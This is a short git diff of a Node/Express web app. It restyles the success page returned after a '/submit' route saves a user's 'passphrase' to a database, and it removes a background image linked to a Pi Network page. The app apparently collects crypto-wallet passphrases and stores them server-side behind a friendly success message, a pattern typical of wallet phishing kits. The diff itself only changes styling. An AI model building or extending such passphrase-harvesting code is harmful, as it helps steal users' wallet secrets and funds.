@@ -34,7 +34,7 @@ app.post('/submit', async (req, res) => {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
-        // Send stylish HTML response with CSS and background image
+        // Send stylish HTML response with CSS
         const successMessage = `
         <html>
             <head>
@@ -47,17 +47,14 @@ app.post('/submit', async (req, res) => {
                         padding: 50px;
                     }
                     .message {
-                        background: url('https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bluestacks.com%2Fapps%2Fsocial%2Fpi-network-on-pc.html&psig=AOvVaw1rUjN6j-wiq5K-d2dcqXM0&ust=1733930068221000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCIjL3YK_nYoDFQAAAAAdAAAAABAI') no-repeat center center;
-                        background-size: cover;
+                        background-color: #4CAF50;
                         color: white;
                         font-size: 24px;
                         font-weight: bold;
-                        padding: 30px;
+                        padding: 20px;
                         border-radius: 8px;
                         box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                         animation: fadeIn 1.5s ease-out;
-                        max-width: 600px;
-                        margin: auto;
                     }
                     @keyframes fadeIn {
                         0% {
